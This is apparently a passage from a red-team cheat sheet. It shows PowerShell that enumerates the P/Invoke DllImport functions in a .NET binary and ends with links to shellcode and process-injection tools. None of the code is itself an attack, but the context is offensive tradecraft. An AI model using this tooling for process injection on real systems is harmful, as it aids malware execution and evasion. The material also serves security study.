$assemblyDefinition = $metadataReader.GetAssemblyDefinition()

foreach($typeHandler in $metadataReader.TypeDefinitions) {
    $typeDef = $metadataReader.GetTypeDefinition($typeHandler)
    foreach($methodHandler in $typeDef.GetMethods()) {
        $methodDef = $metadataReader.GetMethodDefinition($methodHandler)

        $import = $methodDef.GetImport()
        if ($import.Module.IsNil) {
            continue
        }

        $dllImportFuncName = $metadataReader.GetString($import.Name)
        $dllImportParameters = $import.Attributes.ToString()
        $dllImportPath = $metadataReader.GetString($metadataReader.GetModuleReference($import.Module).Name)
        Write-Host "$dllImportPath, $dllImportParameters`n$dllImportFuncName`n"
    }
}
```

Another [method](https://twitter.com/vinopaljiri/status/1508447487048261641) with a PowerShell one-liner:

```powershell
([System.Reflection.Assembly]::LoadFile("\path\to\csharp\binary.exe")).GetTypes() | % {$_.GetMethods([Reflection.BindingFlags]::Public -bxor [Reflection.BindingFlags]::NonPublic -bxor [Reflection.BindingFlags]::Static) | ? {$_.Attributes -band [Reflection.MethodAttributes]::PinvokeImpl}} | fl -Property Name,DeclaringType,CustomAttributes
```




## Tools

- [https://github.com/0xDivyanshu/Injector](https://github.com/0xDivyanshu/Injector)
- [https://github.com/jfmaes/SharpZipRunner](https://github.com/jfmaes/SharpZipRunner)
- [https://github.com/plackyhacker/Shellcode-Injection-Techniques](https://github.com/plackyhacker/Shellcode-Injection-Techniques)
- [https://github.com/3xpl01tc0d3r/ProcessInjection](https://github.com/3xpl01tc0d3r/ProcessInjection)
- [https://github.com/Wra7h/SingleDose](https://github.com/Wra7h/SingleDose)
